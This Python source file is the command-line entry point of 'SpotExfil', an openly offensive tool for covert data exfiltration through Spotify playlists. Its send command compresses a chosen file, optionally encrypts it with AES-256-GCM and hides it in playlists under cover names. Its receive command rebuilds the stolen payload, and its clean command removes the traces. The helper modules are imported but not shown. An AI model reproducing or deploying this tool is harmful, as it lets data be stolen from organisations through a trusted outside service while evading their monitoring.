#!/usr/bin/env python3
"""SpotExfil - Unified CLI for data exfiltration via Spotify playlists.

Single entry point for send, receive, and cleanup operations.
Can be bundled into a standalone executable with PyInstaller.

Usage:
    spotexfil send -f FILE [-k KEY] [--no-compress] [--legacy-names]
    spotexfil receive [-k KEY] [-o OUTPUT]
    spotexfil clean
"""

import argparse
import sys

import encoding
import spotapi as spot

__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'


def build_parser():
    """Build the argument parser with subcommands."""
    parser = argparse.ArgumentParser(
        prog='spotexfil',
        description='SpotExfil: covert data exfiltration via Spotify'
    )
    sub = parser.add_subparsers(dest='command', required=True)

    # --- send ---
    send_p = sub.add_parser('send', help='Exfiltrate a file')
    send_p.add_argument(
        '-f', '--file', required=True,
        help='Path to the file to exfiltrate'
    )
    send_p.add_argument(
        '-k', '--key', default=None,
        help='Encryption passphrase for AES-256-GCM'
    )
    send_p.add_argument(
        '--no-compress', action='store_true',
        help='Disable gzip compression'
    )
    send_p.add_argument(
        '--legacy-names', action='store_true',
        help='Use N-payloadChunk naming instead of cover names'
    )

    # --- receive ---
    recv_p = sub.add_parser('receive', help='Retrieve exfiltrated data')
    recv_p.add_argument(
        '-k', '--key', default=None,
        help='Decryption passphrase (must match encryption key)'
    )
    recv_p.add_argument(
        '-o', '--output', default=None,
        help='Output file path (default: stdout or payload.bin)'
    )

    # --- clean ---
    sub.add_parser('clean', help='Remove all payload playlists')

    return parser


def cmd_send(args):
    """Handle the send subcommand."""
    spotify = spot.Spot(use_cover_names=not args.legacy_names)
    cipher = encoding.Subcipher(
        spotify,
        encryption_key=args.key,
        compress=not args.no_compress,
    )
    spotify.clear_data()
    encoded = cipher.encode_payload(args.file)
    spotify.generate_playlists(encoded)


def cmd_receive(args):
    """Handle the receive subcommand."""
    spotify = spot.Spot()
    cipher = encoding.Subcipher(spotify, encryption_key=args.key)

    results = spotify.retrieve_playlists()
    decoded = cipher.decode_payload(results)

    if not decoded:
        print("[!] No data decoded")
        sys.exit(1)

    output_path = args.output
    try:
        text = decoded.decode('utf-8')
        if output_path:
            with open(output_path, 'w') as f:
                f.write(text)
            print(f"[*] Text payload saved to {output_path}")
        else:
            print(text)
    except UnicodeDecodeError:
        output_path = output_path or "payload.bin"
        with open(output_path, 'wb') as f:
            f.write(decoded)
        print(f"[*] Binary payload saved to {output_path}")


def cmd_clean(args):
    """Handle the clean subcommand."""
    spotify = spot.Spot()
    spotify.clear_data()


def main():
    """Main entry point."""
    parser = build_parser()
    args = parser.parse_args()

    dispatch = {
        'send': cmd_send,
        'receive': cmd_receive,
        'clean': cmd_clean,
    }
    dispatch[args.command](args)


if __name__ == "__main__":
    main()
